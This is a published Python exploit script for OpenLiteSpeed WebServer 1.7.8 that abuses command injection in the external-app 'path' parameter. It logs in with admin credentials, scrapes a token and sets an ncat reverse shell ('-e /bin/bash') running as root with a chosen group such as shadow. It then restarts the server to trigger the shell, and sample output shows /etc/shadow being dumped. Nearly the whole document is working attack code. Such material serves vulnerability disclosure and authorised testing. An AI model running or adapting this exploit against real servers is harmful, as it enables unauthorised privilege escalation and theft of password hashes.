# Exploit Title: Openlitespeed WebServer 1.7.8 - Command Injection (Authenticated) (2)
# Date: 26/1/2021
# Exploit Author: Metin Yunus Kandemir
# Discovered by: cmOs - SunCSR
# Vendor Homepage: https://openlitespeed.org/
# Software Link: https://openlitespeed.org/kb/install-from-binary/
# Version: 1.7.8

import requests
import sys
import urllib3
from bs4 import BeautifulSoup

"""
Description:
The "path" parameter has command injection vulnerability that leads to escalate privilege.
OpenLiteSpeed (1.7.8) web server runs with user(nobody):group(nogroup) privilege. However, extUser and
extGroup parameters could be used to join a group (GID) such as shadow, sudo, etc.
Details: https://github.com/litespeedtech/openlitespeed/issues/217
Example:
Step-1:
ubuntu@ubuntu:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
Step-2:
ubuntu@ubuntu:~$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Step-3:
ubuntu@ubuntu:~/Desktop/exploits$ python3 openlitespeed.py 192.168.1.116:7080 admin MWE1ZmE2 shadow
[+] Authentication was successful!
[+] Version is detected: OpenLiteSpeed 1.7.8
[+] The target is vulnerable!
[+] tk value is obtained: 0.98296300 1612966522
[+] Sending reverse shell to 127.0.0.1:4444 ...
[+] Triggering command execution...
Step-4:
ubuntu@ubuntu:~$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 127.0.0.1 54534 received!
cat /etc/shadow
root:!:18620:0:99999:7:::
daemon:*:17937:0:99999:7:::
bin:*:17937:0:99999:7:::
sys:*:17937:0:99999:7:::
sync:*:17937:0:99999:7:::
.
.
.
"""

def triggerCommandExec(target, s):
    data = {"act" : "restart"}
    trigger = s.post("https://"+target+"/view/serviceMgr.php", data = data, allow_redirects=False, verify=False)
    if trigger.status_code == 200:
        print("[+] Triggering command execution...")
    else:
        print("[-] Someting went wrong!")

def commandExec(tk, groupId, s, target):
    data = {
        "name" : "lsphp",
        "address" : "uds://tmp/lshttpd/lsphp.sock",
        "note" : "",
        "maxConns" : "10",
        "env" : "PHP_LSAPI_CHILDREN=10",
        "initTimeout" : "60",
        "retryTimeout" : "0",
        "persistConn" : "1",
        "pcKeepAliveTimeout" : "",
        "respBuffer" : "0",
        "autoStart" : "2",
        "path" : "/usr/bin/ncat -nv 127.0.0.1 4444 -e /bin/bash",
        "backlog" : "100",
        "instances" : "1",
        "extUser" : "root",
        "extGroup" : groupId ,
        "umask" : "",
        "runOnStartUp" : "1",
        "extMaxIdleTime" : "",
        "priority" : "0",
        "memSoftLimit" : "2047M",
        "memHardLimit" : "2047M",
        "procSoftLimit" : "1400",
        "procHardLimit" : "",
        "a" : "s",
        "m" : "serv",
        "p" : "ext",
        "t" : "A_EXT_LSAPI",
        "r" : "lsphp",
        "tk" : tk
    }
    exec = s.post("https://" + target + "/view/confMgr.php", data = data, allow_redirects=False, verify=False)

    if exec.status_code == 200:
        if exec.text == "Illegal entry point!":
            print("[-] tk value is incorrect!")
            sys.exit(1)
        else:
            print("[+] Sending reverse shell to 127.0.0.1:4444 ...")
    else:
        print("[-] Something went wrong!")
        sys.exit(1)

    triggerCommandExec(target, s)

def loginReq(target, username, password, groupId):
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    s = requests.Session()
    data = {"userid" : username , "pass" : password }
    login = s.post("https://" + target + "/login.php" , data = data, allow_redirects=False, verify=False)

    if login.status_code == 302:
        print("[+] Authentication was successful!")
    elif login.status_code == 200:
        print("[-] Authentication was unsuccessful!")
        sys.exit(1)
    else:
        print("[-] Connection error!")
        sys.exit(1)

    version = s.get("https://" + target + "/index.php")
    versionSource = BeautifulSoup(version.text, "html.parser")
    v = versionSource.find('div', {'class':'project-context hidden-xs'}).text
    print("[+] Version is detected: OpenLiteSpeed %s" %(v.split()[2]))
    if v.split()[2] == "1.7.8":
        print("[+] The target is vulnerable!")

    #getting tk value
    getTk = s.get("https://" + target + "/view/confMgr.php?m=serv&p=ext")
    source = BeautifulSoup(getTk.text, 'html.parser')
    tk = source.find('input', {'name':'tk'}).get('value')
    print("[+] tk value is obtained: "+tk)
    commandExec(tk, groupId, s, target)

def main(args):
    if len(args) != 5:
        print("usage: %s targetIp:port username password groupId " %(args[0]))
        print("Example: python3 openlitespeed.py 192.168.1.116:7080 admin MWE1ZmE2 shadow")
        sys.exit(1)
    loginReq(target=args[1], username=args[2], password=args[3], groupId=args[4])

if __name__ == "__main__":
    main(args=sys.argv)